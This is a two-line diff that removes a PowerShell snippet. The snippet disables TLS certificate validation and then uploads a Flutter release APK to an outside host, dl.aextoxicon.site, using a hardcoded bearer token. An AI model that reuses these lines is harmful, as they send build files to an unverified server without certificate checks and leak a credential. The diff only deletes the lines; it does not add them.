@@ -1,2 +1,0 @@
-[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
-Invoke-WebRequest -Uri "https://dl.aextoxicon.site/upload" -Method Post -Headers @{ "Authorization" = "Bearer 44pT3jNtjXbdvcQP16QKRQVQomQXvFoWAAaQVKoPNq2tNe1nVyqpWVx6GSRvFnENLWhSDNMVGcVEtcR6idt5C7YsSpbg4D5" } -Body (Get-Content "build/app/outputs/flutter-apk/app-release.apk") -ContentType "application/octet-stream"
